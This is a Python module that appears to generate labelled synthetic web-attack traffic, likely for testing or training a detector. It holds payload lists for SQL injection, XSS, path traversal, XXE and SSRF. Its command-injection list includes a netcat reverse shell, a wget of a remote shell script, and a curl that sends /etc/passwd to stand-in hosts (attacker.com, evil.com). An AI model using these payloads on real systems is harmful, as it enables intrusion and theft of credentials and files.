import random
import string
from typing import Dict, List, Tuple
from enum import Enum

class AttackCategory(str, Enum):
    NORMAL = "normal"
    DDOS_FLOOD = "ddos_flood"
    DDOS_SLOWLORIS = "ddos_slowloris"
    DDOS_BURST = "ddos_burst"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "cmd_injection"
    XXE = "xxe"
    SSRF = "ssrf"
    HEADER_INJECTION = "header_injection"

SQL_INJECTION_PATTERNS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM users--",
    "1' AND '1'='1",
    "admin'--",
    "' OR 1=1--",
    "'; INSERT INTO users VALUES('hacker','hacked');--",
    "1; SELECT * FROM information_schema.tables--",
    "' UNION SELECT username, password FROM users--",
    "1' ORDER BY 1--",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "'; EXEC xp_cmdshell('dir');--",
    "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1--",
]

XSS_PATTERNS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "'-alert('XSS')-'",
    "<div style='background:url(javascript:alert(1))'>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type=submit>",
]

PATH_TRAVERSAL_PATTERNS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00",
    "....\\....\\....\\windows\\win.ini",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%255c..%255c..%255cwindows/win.ini",
    "/var/log/apache2/access.log",
]

CMD_INJECTION_PATTERNS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(cat /etc/passwd)",
    "; nc -e /bin/sh attacker.com 4444",
    "| wget http://evil.com/shell.sh",
    "&& curl http://evil.com/exfil?data=$(cat /etc/passwd)",
    "; ping -c 10 attacker.com",
    "| nslookup attacker.com",
]

XXE_PATTERNS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]>',
]

SSRF_PATTERNS = [
    "http://localhost/admin",
    "http://127.0.0.1:22",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/admin",
    "http://0.0.0.0:8080",
    "file:///etc/passwd",
    "dict://localhost:11211/stats",
    "gopher://localhost:6379/_INFO",
]

HEADER_INJECTION_PATTERNS = [
    "X-Forwarded-For: 127.0.0.1",
    "X-Original-URL: /admin",
    "X-Rewrite-URL: /admin",
    "Host: evil.com",
    "X-Forwarded-Host: evil.com",
    "X-Custom-IP-Authorization: 127.0.0.1",
]

MALICIOUS_USER_AGENTS = [
    "sqlmap/1.0",
    "nikto/2.1.6",
    "Nessus",
    "masscan/1.0",
    "nmap scripting engine",
    "DirBuster-1.0",
    "gobuster/3.0",
    "wfuzz/2.4",
    "hydra",
    "Metasploit",
]

def get_random_pattern(category: AttackCategory) -> Tuple[str, str, Dict]:
    if category == AttackCategory.SQL_INJECTION:
        pattern = random.choice(SQL_INJECTION_PATTERNS)
        return pattern, "sql_injection", {"field": random.choice(["id", "user", "search", "query"])}
    elif category == AttackCategory.XSS:
        pattern = random.choice(XSS_PATTERNS)
        return pattern, "xss", {"field": random.choice(["comment", "name", "message", "input"])}
    elif category == AttackCategory.PATH_TRAVERSAL:
        pattern = random.choice(PATH_TRAVERSAL_PATTERNS)
        return pattern, "path_traversal", {"param": "file"}
    elif category == AttackCategory.COMMAND_INJECTION:
        pattern = random.choice(CMD_INJECTION_PATTERNS)
        return pattern, "cmd_injection", {"field": random.choice(["cmd", "exec", "ping", "host"])}
    elif category == AttackCategory.XXE:
        pattern = random.choice(XXE_PATTERNS)
        return pattern, "xxe", {"content_type": "application/xml"}
    elif category == AttackCategory.SSRF:
        pattern = random.choice(SSRF_PATTERNS)
        return pattern, "ssrf", {"param": random.choice(["url", "redirect", "next", "callback"])}
    elif category == AttackCategory.HEADER_INJECTION:
        pattern = random.choice(HEADER_INJECTION_PATTERNS)
        return pattern, "header_injection", {}
    return "", "normal", {}

def generate_random_payload(size_bytes: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))

def generate_malicious_headers() -> Dict[str, str]:
    headers = {}
    if random.random() < 0.3:
        headers["User-Agent"] = random.choice(MALICIOUS_USER_AGENTS)
    if random.random() < 0.2:
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    if random.random() < 0.1:
        headers["Referer"] = "http://evil.com/attack"
    return headers

def get_attack_categories() -> List[AttackCategory]:
    return [
        AttackCategory.SQL_INJECTION,
        AttackCategory.XSS,
        AttackCategory.PATH_TRAVERSAL,
        AttackCategory.COMMAND_INJECTION,
        AttackCategory.XXE,
        AttackCategory.SSRF,
    ]
